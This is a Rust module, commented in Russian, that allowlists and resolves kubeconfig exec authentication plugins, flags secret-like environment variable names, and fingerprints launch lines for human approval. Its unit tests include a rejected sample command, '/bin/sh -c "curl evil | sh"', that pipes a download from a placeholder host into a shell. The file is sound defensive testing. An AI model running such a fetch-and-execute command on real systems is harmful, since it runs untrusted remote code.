//! Exec-плагины kubeconfig (спец. §5.2): список разрешённых команд, путь к команде, строка запуска
//! и её подтверждение человеком. Glafira запускает только команды из списка, по абсолютному пути
//! и без оболочки.

use std::path::{Path, PathBuf};

use sha2::{Digest, Sha256};

use crate::i18n::LocalizedText;
use crate::storage::profile::ExecAuth;

/// Разрешённые команды: имя исполняемого файла и первые позиционные аргументы
/// (пустой список — любые аргументы).
pub const ALLOWED: &[(&str, &[&str])] = &[
    // EKS
    ("aws", &["eks", "get-token"]),
    // EKS, старые kubeconfig
    ("aws-iam-authenticator", &["token"]),
    // GKE
    ("gke-gcloud-auth-plugin", &[]),
    // AKS (Azure kubelogin) и OIDC (int128/kubelogin)
    ("kubelogin", &["get-token"]),
    // OIDC: Keycloak, Dex (в том числе Deckhouse)
    ("kubectl", &["oidc-login", "get-token"]),
    // OpenShift с внешним OIDC (ROSA HCP с external auth)
    ("oc", &["get-token"]),
    // Yandex Managed Kubernetes
    ("yc", &["k8s", "create-token"]),
    // Rancher без генерации токенов в kubeconfig
    ("rancher", &["token"]),
];

/// Имя исполняемого файла без каталога и `.exe`; на Windows — без учёта регистра.
pub fn command_name(command: &str) -> String {
    let name = Path::new(command)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();
    let name = if cfg!(windows) {
        name.to_lowercase()
    } else {
        name
    };
    match name.len().checked_sub(4) {
        Some(i) if name.is_char_boundary(i) && name[i..].eq_ignore_ascii_case(".exe") => {
            name[..i].to_string()
        }
        _ => name,
    }
}

/// Позиционные аргументы: ведущие ключи пропускаются (`--ключ значение`, `--ключ=значение`) —
/// так `aws eks update-kubeconfig` пишет `--region` перед `eks get-token`.
fn positional(args: &[String]) -> &[String] {
    let mut i = 0;
    while i < args.len() && args[i].starts_with('-') {
        i += if args[i].contains('=') { 1 } else { 2 };
    }
    &args[i.min(args.len())..]
}

/// Разрешена ли команда: имя файла и первые позиционные аргументы из `ALLOWED`.
pub fn check_allowed(command: &str, args: &[String]) -> Result<(), LocalizedText> {
    let name = command_name(command);
    let Some((_, prefix)) = ALLOWED.iter().find(|(n, _)| *n == name) else {
        return Err(ltext!(
            "errors.exec.notAllowed",
            "“{{command}}” is not in the list of allowed exec plugins",
            command = name
        ));
    };
    let pos = positional(args);
    let matches = pos.len() >= prefix.len() && prefix.iter().zip(pos).all(|(p, a)| p == a);
    if !matches {
        return Err(ltext!(
            "errors.exec.argsNotAllowed",
            "The exec plugin “{{command}}” may run only as “{{expected}} …”",
            command = name,
            expected = std::iter::once(name.as_str())
                .chain(prefix.iter().copied())
                .collect::<Vec<_>>()
                .join(" ")
        ));
    }
    Ok(())
}

/// Похоже ли имя переменной окружения на секрет: такие значения не показываются и не экспортируются.
pub fn is_secret_name(name: &str) -> bool {
    let n = name.to_ascii_uppercase();
    ["TOKEN", "SECRET", "PASSWORD", "PASSWD", "KEY", "CREDENTIAL"]
        .iter()
        .any(|w| n.contains(w))
}

/// Отпечаток строки запуска: путь, аргументы, переменные окружения, версия API и
/// `provideClusterInfo`. Подтверждение человека хранится как этот отпечаток.
pub fn fingerprint(e: &ExecAuth) -> String {
    let env: Vec<(&str, &str)> = e
        .env
        .iter()
        .map(|v| (v.name.as_str(), v.value.as_str()))
        .collect();
    let canonical = serde_json::to_vec(&(
        &e.command,
        &e.args,
        env,
        &e.api_version,
        e.provide_cluster_info,
    ))
    .expect("serializable");
    Sha256::digest(&canonical)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// Подтверждена ли человеком именно эта строка запуска.
pub fn is_approved(e: &ExecAuth) -> bool {
    e.approved.as_deref() == Some(fingerprint(e).as_str())
}

/// Стандартные каталоги команд, которых может не быть в PATH приложения: Homebrew,
/// `/usr/local/bin`, `~/.local/bin`; на Windows — ярлыки winget и `%LOCALAPPDATA%`.
pub fn standard_dirs(home: Option<&Path>, local_app_data: Option<&Path>) -> Vec<PathBuf> {
    if cfg!(windows) {
        local_app_data
            .map(|d| {
                vec![
                    d.join("Microsoft").join("WinGet").join("Links"),
                    d.to_path_buf(),
                ]
            })
            .unwrap_or_default()
    } else {
        let mut dirs = vec![
            PathBuf::from("/opt/homebrew/bin"),
            PathBuf::from("/usr/local/bin"),
        ];
        if let Some(h) = home {
            dirs.push(h.join(".local").join("bin"));
        }
        dirs
    }
}

/// Где искать команду: каталоги PATH (оболочки входа или процесса), затем стандартные; без повторов.
pub fn search_dirs(path_var: Option<&str>, standard: Vec<PathBuf>) -> Vec<PathBuf> {
    let mut out: Vec<PathBuf> = Vec::new();
    let from_path = path_var
        .map(|p| std::env::split_paths(p).collect::<Vec<_>>())
        .unwrap_or_default();
    for d in from_path.into_iter().chain(standard) {
        if !d.as_os_str().is_empty() && !out.contains(&d) {
            out.push(d);
        }
    }
    out
}

/// Абсолютный путь к команде: абсолютный путь — как есть, относительный путь с каталогом —
/// от каталога kubeconfig (`base`, как у kubectl), имя — поиском по `dirs`. `None` — не найдена.
pub fn resolve_command(
    command: &str,
    base: Option<&Path>,
    dirs: &[PathBuf],
    is_file: &dyn Fn(&Path) -> bool,
) -> Option<PathBuf> {
    let p = Path::new(command.trim());
    if p.as_os_str().is_empty() {
        return None;
    }
    if p.is_absolute() {
        return is_file(p).then(|| p.to_path_buf());
    }
    if p.components().count() > 1 {
        return base.map(|b| b.join(p)).filter(|c| is_file(c));
    }
    dirs.iter().find_map(|d| {
        let mut candidates = vec![d.join(p)];
        if cfg!(windows) && p.extension().is_none() {
            candidates.push(d.join(format!("{}.exe", p.display())));
        }
        candidates.into_iter().find(|c| is_file(c))
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::storage::profile::{ExecEnv, sample_exec};

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| s.to_string()).collect()
    }

    /// Список разрешённых команд (спец. §5.2): имя и первые аргументы.
    #[test]
    fn allowlist_table() {
        let allowed = [
            (
                "/usr/local/bin/aws",
                &[
                    "--region",
                    "eu-west-1",
                    "eks",
                    "get-token",
                    "--cluster-name",
                    "c",
                ][..],
            ),
            (
                "/usr/local/bin/aws",
                &["--profile=dev", "eks", "get-token"][..],
            ),
            ("/usr/bin/aws-iam-authenticator", &["token", "-i", "c"][..]),
            ("/opt/gcloud/bin/gke-gcloud-auth-plugin", &[][..]),
            (
                "/opt/homebrew/bin/kubelogin",
                &["get-token", "--login", "azurecli", "--server-id", "x"][..],
            ),
            (
                "/usr/local/bin/kubectl",
                &["oidc-login", "get-token", "--oidc-issuer-url=https://dex"][..],
            ),
            (
                "/usr/local/bin/oc",
                &["get-token", "--issuer-url=https://x"][..],
            ),
            (
                "/home/u/yandex-cloud/bin/yc",
                &["k8s", "create-token", "--profile=default"][..],
            ),
            (
                "/usr/local/bin/rancher",
                &["token", "--server=rancher.corp"][..],
            ),
        ];
        for (cmd, a) in allowed {
            assert_eq!(check_allowed(cmd, &args(a)), Ok(()), "{cmd} {a:?}");
        }
        let rejected = [
            (
                "/bin/sh",
                &["-c", "curl evil | sh"][..],
                "errors.exec.notAllowed",
            ),
            (
                "/usr/bin/python3",
                &["get-token"][..],
                "errors.exec.notAllowed",
            ),
            (
                "/usr/local/bin/kubectl",
                &["get", "pods"][..],
                "errors.exec.argsNotAllowed",
            ),
            (
                "/usr/local/bin/kubectl",
                &["oidc-login"][..],
                "errors.exec.argsNotAllowed",
            ),
            (
                "/usr/local/bin/aws",
                &["s3", "ls"][..],
                "errors.exec.argsNotAllowed",
            ),
            ("/usr/local/bin/oc", &[][..], "errors.exec.argsNotAllowed"),
            (
                "/usr/local/bin/kubectl-evil",
                &["oidc-login", "get-token"][..],
                "errors.exec.notAllowed",
            ),
        ];
        for (cmd, a, key) in rejected {
            assert_eq!(
                check_allowed(cmd, &args(a)).unwrap_err().key,
                key,
                "{cmd} {a:?}"
            );
        }
        let e = check_allowed("/usr/local/bin/kubectl", &args(&["get"])).unwrap_err();
        assert_eq!(e.params["expected"], "kubectl oidc-login get-token");
    }

    #[test]
    fn command_names() {
        assert_eq!(command_name("/usr/local/bin/kubelogin"), "kubelogin");
        assert_eq!(command_name("kubelogin.exe"), "kubelogin");
        assert_eq!(command_name("aws.EXE"), "aws");
        assert_eq!(command_name(""), "");
    }

    #[test]
    fn secret_like_names() {
        for s in [
            "AWS_SECRET_ACCESS_KEY",
            "AWS_SESSION_TOKEN",
            "OIDC_PASSWORD",
            "api_key",
        ] {
            assert!(is_secret_name(s), "{s}");
        }
        for s in [
            "AWS_PROFILE",
            "AWS_REGION",
            "HTTPS_PROXY",
            "KUBECONFIG",
            "PATH",
        ] {
            assert!(!is_secret_name(s), "{s}");
        }
    }

    #[test]
    fn approval_follows_the_launch_line() {
        let mut e = sample_exec();
        assert!(!is_approved(&e));
        e.approved = Some(fingerprint(&e));
        assert!(is_approved(&e));
        let fp = fingerprint(&e);
        assert_eq!(fp.len(), 64);
        for change in [
            |e: &mut ExecAuth| e.command = "/opt/homebrew/bin/kubectl".into(),
            |e: &mut ExecAuth| e.args.push("--v=1".into()),
            |e: &mut ExecAuth| {
                e.env.push(ExecEnv {
                    name: "X".into(),
                    value: "1".into(),
                })
            },
            |e: &mut ExecAuth| e.env[0].value = "http://other:3128".into(),
            |e: &mut ExecAuth| e.provide_cluster_info = true,
        ] {
            let mut changed = e.clone();
            change(&mut changed);
            assert!(!is_approved(&changed), "{changed:?}");
        }
    }

    #[test]
    fn command_resolution() {
        let files = [
            PathBuf::from("/opt/homebrew/bin/kubelogin"),
            PathBuf::from("/home/u/.kube/bin/plugin"),
            PathBuf::from("/usr/bin/aws"),
        ];
        let is_file = |p: &Path| files.iter().any(|f| f == p);
        let dirs = search_dirs(
            Some("/usr/bin:/bin"),
            standard_dirs(Some(Path::new("/home/u")), None),
        );
        if cfg!(unix) {
            assert_eq!(
                dirs,
                [
                    "/usr/bin",
                    "/bin",
                    "/opt/homebrew/bin",
                    "/usr/local/bin",
                    "/home/u/.local/bin"
                ]
                .map(PathBuf::from)
            );
            assert_eq!(
                resolve_command("kubelogin", None, &dirs, &is_file),
                Some(PathBuf::from("/opt/homebrew/bin/kubelogin"))
            );
            assert_eq!(
                resolve_command("aws", None, &dirs, &is_file),
                Some(PathBuf::from("/usr/bin/aws")),
                "PATH раньше стандартных каталогов"
            );
            assert_eq!(
                resolve_command(
                    "bin/plugin",
                    Some(Path::new("/home/u/.kube")),
                    &dirs,
                    &is_file
                ),
                Some(PathBuf::from("/home/u/.kube/bin/plugin")),
                "относительный путь — от каталога kubeconfig"
            );
            assert_eq!(
                resolve_command("/usr/bin/aws", None, &[], &is_file),
                Some(PathBuf::from("/usr/bin/aws"))
            );
        }
        assert_eq!(
            resolve_command("gke-gcloud-auth-plugin", None, &dirs, &is_file),
            None
        );
        assert_eq!(resolve_command(" ", None, &dirs, &is_file), None);
    }
}
